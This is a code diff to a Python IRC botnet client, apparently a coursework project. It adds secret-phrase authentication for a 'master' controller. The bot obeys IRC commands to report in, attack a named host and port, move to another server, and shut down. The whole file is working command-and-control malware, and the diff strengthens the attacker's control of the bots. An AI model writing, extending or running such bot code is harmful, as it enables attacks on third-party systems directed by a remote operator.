@@ -2,6 +2,25 @@ import sys, os
 import socket
 import select
 
+def checkMaster(response, secretphase, temp_master):
+    if temp_master != "":
+        return temp_master
+    try:
+        temp_master = response.split("!", 1)[0]
+        temp_master = temp_master.split(":", 2)[1]
+
+        size = len(response.split())
+        temp_secret = response.split(" ", size)[size-1]
+        temp_secret = (temp_secret.split(":", 2)[1]).strip("\r\n")
+
+        if temp_secret == secretphase:
+            print("found master, named " + temp_master + ", secret is " + temp_secret)
+            return temp_master
+        else: return ""
+    except:
+        return ""
+
+
 try:
     hostname = sys.argv[1]
     port = int(sys.argv[2])
@@ -37,13 +56,14 @@ irc.send(bytes("JOIN #" + channel + "\r\n", "utf-8"))
 
 atk_count = 0
 fail_count = 0
-master = "BetterThanYou"
+master = ""
 
 while 1:
     ready = select.select([irc], [], [], 2) # wait 2 seconds
     if ready[0]:
         response = (irc.recv(1024)).decode("utf-8")
         print(response)
+        master = checkMaster(response, secretphase, master)
     else:
         continue
 
@@ -52,11 +72,11 @@ while 1:
         irc.send(bytes("PONG " + argument + "\r\n", "utf-8"))
 
     # controller's status
-    if "To me, my minions" in response:
+    if "To me, my minions" in response and master != "":
         irc.send(bytes("PRIVMSG " + master + " :" + nickname +"\r\n", "utf-8"))
 
     # controller's attack
-    if "Attack" in response:
+    if "Attack" in response and master != "":
         victim = response.split(":Attack ", 2)[1]
         atk_host = victim.split(" ", 1)[0]
         atk_port = victim.split(" ", 2)[1]
@@ -73,10 +93,8 @@ while 1:
         atk.close()
         irc.send(bytes("PRIVMSG " + master + "  :attack successful, count = " + str(1) + "\r\n", "utf-8"))
 
-
-
     # controller's move
-    if "Move" in response:
+    if "Move" in response and master != "":
         try:
             victim = response.split(":Move ", 2)[1]
             move_host = victim.split(" ", 1)[0]
@@ -118,6 +136,6 @@ while 1:
             irc.send(bytes("PRIVMSG " + master + " :move unsuccessful\r\n", "utf-8"))
 
     # controller's shutdown
-    if "Go home, guys" in response:
+    if "Go home, guys" in response and master != "":
         irc.send(bytes("QUIT\r\n", "utf-8"))
         sys.exit(0)
